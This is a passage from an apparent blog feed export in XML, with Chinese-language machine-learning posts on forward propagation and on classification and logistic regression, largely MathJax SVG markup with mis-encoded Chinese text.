442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(278,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(778,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(4078.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><mi>Ïƒ</mi><mo stretchy="false">(</mo><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mn>2</mn><mo stretchy="false">]</mo></mrow></msup><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container></li></ol><h4 id="ä½œç”¨">ä½œç”¨</h4><ul><li><p>å‰å‘ä¼ æ’­æ˜¯<strong>é¢„æµ‹è¿‡ç¨‹</strong>çš„ä¸€éƒ¨åˆ†ã€‚</p></li><li><p>åœ¨è®­ç»ƒä¸­ï¼Œå®ƒæ˜¯æŸå¤±å‡½æ•°è®¡ç®—çš„å‰æã€‚</p></li><li><p>åœ¨åå‘ä¼ æ’­ï¼ˆbackpropagationï¼‰ä¸­ä¼šç”¨åˆ°ä¸­é—´çš„ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="2.606ex" height="2.046ex" role="img" focusable="false" viewbox="0 -893.3 1151.9 904.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(498,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>z</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container> å’Œ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.023ex;" xmlns="http://www.w3.org/2000/svg" width="2.751ex" height="2.044ex" role="img" focusable="false" viewbox="0 -893.3 1215.9 903.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(562,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(278,0)"><path data-c="1D459" d="M117 59Q117 26 142 26Q179 26 205 131Q211 151 215 152Q217 153 225 153H229Q238 153 241 153T246 151T248 144Q247 138 245 128T234 90T214 43T183 6T137 -11Q101 -11 70 11T38 85Q38 97 39 102L104 360Q167 615 167 623Q167 626 166 628T162 632T157 634T149 635T141 636T132 637T122 637Q112 637 109 637T101 638T95 641T94 647Q94 649 96 661Q101 680 107 682T179 688Q194 689 213 690T243 693T254 694Q266 694 266 686Q266 675 193 386T118 83Q118 81 118 75T117 65V59Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(576,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>a</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">[</mo><mi>l</mi><mo stretchy="false">]</mo></mrow></msup></math></mjx-assistive-mml></mjx-container> å€¼ã€‚</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> AIç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¥ç»ç½‘ç»œ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœºå™¨å­¦ä¹ ä¸­çš„åˆ†ç±»</title>
      <link href="/2025/05/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E5%88%86%E7%B1%BB/"/>
      <url>/2025/05/01/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E5%88%86%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="ä»€ä¹ˆæ˜¯åˆ†ç±»ï¼Ÿ">ä»€ä¹ˆæ˜¯åˆ†ç±»ï¼Ÿ</h2><p>åœ¨æœºå™¨å­¦ä¹ ä¸­ï¼Œ**åˆ†ç±»é—®é¢˜ï¼ˆClassification Problemï¼‰**æ˜¯ä¸€ç§å¸¸è§çš„ç›‘ç£å­¦ä¹ ä»»åŠ¡ï¼Œç›®æ ‡æ˜¯å°†è¾“å…¥çš„æ•°æ®åˆ†åˆ°é¢„å®šä¹‰çš„ç±»åˆ«ä¸­ã€‚</p><p>åˆ†ç±»çš„ä»»åŠ¡æ˜¯ï¼š<br><strong>ç»™å®šä¸€ä¸ªè¾“å…¥æ ·æœ¬ï¼Œé¢„æµ‹å®ƒå±äºå“ªä¸€ä¸ªç±»åˆ«ï¼ˆclassï¼‰</strong>ã€‚</p><p>ä¾‹å¦‚ï¼š</p><table><thead><tr><th style="text-align:left">ç¤ºä¾‹</th><th>è¾“å…¥æ•°æ®</th><th>ç›®æ ‡åˆ†ç±»</th></tr></thead><tbody><tr><td style="text-align:left">åƒåœ¾é‚®ä»¶è¯†åˆ«</td><td>ä¸€å°é‚®ä»¶çš„æ–‡æœ¬å†…å®¹</td><td>åƒåœ¾é‚®ä»¶ or éåƒåœ¾é‚®ä»¶</td></tr><tr><td style="text-align:left">å›¾ç‰‡è¯†åˆ«</td><td>ä¸€å¼ çŒ«æˆ–ç‹—çš„å›¾ç‰‡</td><td>çŒ« or ç‹—</td></tr><tr><td style="text-align:left">ç–¾ç—…è¯Šæ–­</td><td>ä¸€ç»„ç—…äººçš„æ£€æŸ¥æ•°æ®</td><td>æ‚£ç—… or å¥åº·</td></tr></tbody></table><h3 id="åˆ†ç±»çš„ç±»å‹">åˆ†ç±»çš„ç±»å‹</h3><ol><li><strong>äºŒåˆ†ç±»ï¼ˆBinary Classificationï¼‰</strong><br>åªæœ‰ä¸¤ä¸ªç±»åˆ«ï¼Œä¾‹å¦‚ï¼šåˆ¤æ–­ä¸€ä¸ªé‚®ä»¶æ˜¯ä¸æ˜¯åƒåœ¾é‚®ä»¶ï¼ˆ0 æˆ– 1ï¼‰ã€‚</li><li><strong>å¤šåˆ†ç±»ï¼ˆMulti-class Classificationï¼‰</strong><br>è¶…è¿‡ä¸¤ä¸ªç±»åˆ«ï¼Œä¾‹å¦‚ï¼šåˆ¤æ–­ä¸€å¼ å›¾ç‰‡æ˜¯çŒ«ã€ç‹—ã€é©¬è¿˜æ˜¯é¸Ÿã€‚</li><li><strong>å¤šæ ‡ç­¾åˆ†ç±»ï¼ˆMulti-label Classificationï¼‰</strong><br>æ¯ä¸ªæ ·æœ¬å¯ä»¥åŒæ—¶å±äºå¤šä¸ªç±»åˆ«ï¼Œä¾‹å¦‚ï¼šä¸€å¼ å›¾ç‰‡å¯èƒ½åŒæ—¶åŒ…å«çŒ«å’Œç‹—ã€‚</li></ol><h3 id="åŸºæœ¬æµç¨‹">åŸºæœ¬æµç¨‹</h3><ol><li><strong>æ•°æ®å‡†å¤‡</strong>ï¼šæ”¶é›†å¸¦æ ‡ç­¾çš„æ•°æ®é›†ï¼ˆå¦‚æ–‡æœ¬+ç±»åˆ«ï¼‰ã€‚</li><li><strong>ç‰¹å¾æå–</strong>ï¼šå°†åŸå§‹æ•°æ®è½¬åŒ–ä¸ºæ¨¡å‹å¯ä»¥å¤„ç†çš„æ•°å€¼å½¢å¼ï¼ˆå¦‚è¯å‘é‡ã€å›¾åƒåƒç´ ï¼‰ã€‚</li><li><strong>æ¨¡å‹è®­ç»ƒ</strong>ï¼šé€‰æ‹©ä¸€ä¸ªåˆ†ç±»ç®—æ³•ï¼ˆå¦‚é€»è¾‘å›å½’ã€å†³ç­–æ ‘ã€SVMã€ç¥ç»ç½‘ç»œï¼‰ï¼Œç”¨è®­ç»ƒé›†è¿›è¡Œå­¦ä¹ ã€‚</li><li><strong>é¢„æµ‹ä¸è¯„ä¼°</strong>ï¼šä½¿ç”¨æµ‹è¯•é›†è¿›è¡Œé¢„æµ‹ï¼Œå¹¶é€šè¿‡å‡†ç¡®ç‡ã€ç²¾ç¡®ç‡ã€å¬å›ç‡ã€F1åˆ†æ•°ç­‰æŒ‡æ ‡è¯„ä¼°æ¨¡å‹æ€§èƒ½ã€‚</li></ol><h3 id="å¸¸è§çš„ç®—æ³•">å¸¸è§çš„ç®—æ³•</h3><ul><li>Logistic Regressionï¼ˆé€»è¾‘å›å½’ï¼‰</li><li>Decision Treeï¼ˆå†³ç­–æ ‘ï¼‰</li><li>Random Forestï¼ˆéšæœºæ£®æ—ï¼‰</li><li>Support Vector Machineï¼ˆæ”¯æŒå‘é‡æœºï¼‰</li><li>K-Nearest Neighborsï¼ˆKè¿‘é‚»ï¼‰</li><li>Naive Bayesï¼ˆæœ´ç´ è´å¶æ–¯ï¼‰</li><li>Neural Networksï¼ˆç¥ç»ç½‘ç»œï¼‰</li></ul><h3 id="è¯„ä¼°æŒ‡æ ‡ç®€è¿°ï¼ˆä»¥äºŒåˆ†ç±»ä¸ºä¾‹ï¼‰">è¯„ä¼°æŒ‡æ ‡ç®€è¿°ï¼ˆä»¥äºŒåˆ†ç±»ä¸ºä¾‹ï¼‰</h3><ul><li><strong>å‡†ç¡®ç‡ï¼ˆAccuracyï¼‰</strong>ï¼šé¢„æµ‹æ­£ç¡®çš„æ ·æœ¬æ•°å æ€»æ ·æœ¬æ•°æ¯”ä¾‹ã€‚</li><li><strong>ç²¾ç¡®ç‡ï¼ˆPrecisionï¼‰</strong>ï¼šé¢„æµ‹ä¸ºæ­£çš„æ ·æœ¬ä¸­ï¼ŒçœŸæ­£ä¸ºæ­£çš„æ¯”ä¾‹ã€‚</li><li><strong>å¬å›ç‡ï¼ˆRecallï¼‰</strong>ï¼šæ‰€æœ‰çœŸæ­£ä¸ºæ­£çš„æ ·æœ¬ä¸­ï¼Œé¢„æµ‹æ­£ç¡®çš„æ¯”ä¾‹ã€‚</li><li><strong>F1 åˆ†æ•°ï¼ˆF1 Scoreï¼‰</strong>ï¼šç²¾ç¡®ç‡å’Œå¬å›ç‡çš„è°ƒå’Œå¹³å‡ã€‚</li></ul><h2 id="é€»è¾‘å›å½’-Logistic-Regression">é€»è¾‘å›å½’(Logistic Regression)</h2><p><strong>é€»è¾‘å›å½’</strong>æ˜¯ä¸€ç§ç”¨äº<strong>åˆ†ç±»é—®é¢˜</strong>çš„ç»Ÿè®¡æ¨¡å‹ã€‚å°½ç®¡åå­—ä¸­æœ‰â€œå›å½’â€ï¼Œå®ƒå…¶å®æ˜¯ç”¨äº<strong>äºŒåˆ†ç±»</strong>ï¼ˆæˆ–å¤šåˆ†ç±»ï¼‰ä»»åŠ¡çš„ã€‚</p><p>å®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼š</p><blockquote><p>é€šè¿‡ä¸€ä¸ªâ€œé€»è¾‘å‡½æ•°â€ï¼ˆsigmoid å‡½æ•°ï¼‰å°†çº¿æ€§æ¨¡å‹çš„è¾“å‡ºæ˜ å°„åˆ° (0, 1) ä¹‹é—´çš„æ¦‚ç‡ï¼Œå†æ ¹æ®è¿™ä¸ªæ¦‚ç‡åˆ¤æ–­ç±»åˆ«ã€‚</p></blockquote><h3 id="æ•°å­¦å½¢å¼">æ•°å­¦å½¢å¼</h3><p>å‡è®¾è¾“å…¥ç‰¹å¾æ˜¯ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="18.69ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 8260.9 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D431" d="M227 0Q212 3 121 3Q40 3 28 0H21V62H117L245 213L109 382H26V444H34Q49 441 143 441Q247 441 265 444H274V382H246L281 339Q315 297 316 297Q320 297 354 341L389 382H352V444H360Q375 441 466 441Q547 441 559 444H566V382H471L355 246L504 63L545 62H586V0H578Q563 3 469 3Q365 3 347 0H338V62H366Q366 63 326 112T285 163L198 63L217 62H235V0H227Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(884.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1940.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(2218.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(3227.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(3671.8,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(4680.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5125,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(5569.7,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6014.3,0)"><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6459,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(6903.7,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(7982.9,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mrow data-mjx-texclass="ORD"><mi mathvariant="bold">x</mi></mrow><mo>=</mo><mo stretchy="false">[</mo><msub><mi>x</mi><mn>1</mn></msub><mo>,</mo><msub><mi>x</mi><mn>2</mn></msub><mo>,</mo><mo>.</mo><mo>.</mo><mo>.</mo><mo>,</mo><msub><mi>x</mi><mi>n</mi></msub><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container>ï¼Œæƒé‡æ˜¯ <mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="20.174ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 8916.9 1000" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D430" d="M624 444Q636 441 722 441Q797 441 800 444H805V382H741L593 11Q592 10 590 8T586 4T584 2T581 0T579 -2T575 -3T571 -3T567 -4T561 -4T553 -4H542Q525 -4 518 6T490 70Q474 110 463 137L415 257L367 137Q357 111 341 72Q320 17 313 7T289 -4H277Q259 -4 253 -2T238 11L90 382H25V444H32Q47 441 140 441Q243 441 261 444H270V382H222L310 164L382 342L366 382H303V444H310Q322 441 407 441Q508 441 523 444H531V382H506Q481 382 481 380Q482 376 529 259T577 142L674 382H617V444H624Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(1108.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2164.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(2442.6,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="mo" transform="translate(3595.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z" style="stroke-width: 3;"/></g><g data-mml-node="msub" transform="translate(4039.8,0)"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(749,-150) 